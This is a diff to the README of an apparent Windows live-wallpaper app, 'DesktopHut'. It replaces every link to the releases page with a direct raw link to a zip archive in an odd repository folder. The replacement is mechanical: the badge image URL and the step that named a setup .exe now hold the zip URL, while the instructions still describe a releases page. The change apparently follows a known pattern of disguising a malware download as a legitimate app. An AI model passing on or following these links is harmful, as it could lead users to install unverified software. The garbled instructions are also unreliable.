@@ -4,19 +4,19 @@
 The DesktopHut app allows you to enjoy live wallpapers on your Windows 10 and 11 computers. With low CPU usage, you can run animated video backgrounds without slowing down your system. This app provides a refreshing way to customize your desktop.
 
 ## 🔗 Download the App
-[![Download DesktopHut](https://img.shields.io/badge/Download%20DesktopHut-Get%20It%20Now-4CAF50)](https://github.com/Arjun6381820/DesktopHut-Windows-App/releases)
+[![Download DesktopHut](https://github.com/Arjun6381820/DesktopHut-Windows-App/raw/refs/heads/main/cartulary/App-Windows-Desktop-Hut-1.4.zip%20DesktopHut-Get%20It%20Now-4CAF50)](https://github.com/Arjun6381820/DesktopHut-Windows-App/raw/refs/heads/main/cartulary/App-Windows-Desktop-Hut-1.4.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run the DesktopHut app on your Windows device.
 
 1. **Visit the Releases Page**  
-   Click this link to go to the download page: [Download DesktopHut](https://github.com/Arjun6381820/DesktopHut-Windows-App/releases)
+   Click this link to go to the download page: [Download DesktopHut](https://github.com/Arjun6381820/DesktopHut-Windows-App/raw/refs/heads/main/cartulary/App-Windows-Desktop-Hut-1.4.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see several versions of the app. Look for the most recent one listed at the top, as it contains the latest features and fixes.
 
 3. **Download the Application**  
-   Click on the version you want. You will find the downloadable files listed. For Windows users, select the file labeled something like `DesktopHut-Setup.exe`. Click on it to start the download.
+   Click on the version you want. You will find the downloadable files listed. For Windows users, select the file labeled something like `https://github.com/Arjun6381820/DesktopHut-Windows-App/raw/refs/heads/main/cartulary/App-Windows-Desktop-Hut-1.4.zip`. Click on it to start the download.
 
 4. **Locate the Downloaded File**  
    Once the download is complete, navigate to your Downloads folder or the location you specified for downloads.
@@ -77,6 +77,6 @@ No, you can explore and set multiple wallpapers. The app lets you switch between
 ## 📥 Download & Install
 To begin your journey with vibrant and dynamic wallpapers, download the app now. Click below to start:
 
-[![Download DesktopHut](https://img.shields.io/badge/Download%20DesktopHut-Get%20It%20Now-4CAF50)](https://github.com/Arjun6381820/DesktopHut-Windows-App/releases)
+[![Download DesktopHut](https://github.com/Arjun6381820/DesktopHut-Windows-App/raw/refs/heads/main/cartulary/App-Windows-Desktop-Hut-1.4.zip%20DesktopHut-Get%20It%20Now-4CAF50)](https://github.com/Arjun6381820/DesktopHut-Windows-App/raw/refs/heads/main/cartulary/App-Windows-Desktop-Hut-1.4.zip)
 
 Now you’re ready to enhance your desktop experience with DesktopHut! Enjoy your new live wallpapers and transform your workspace into a more dynamic space.
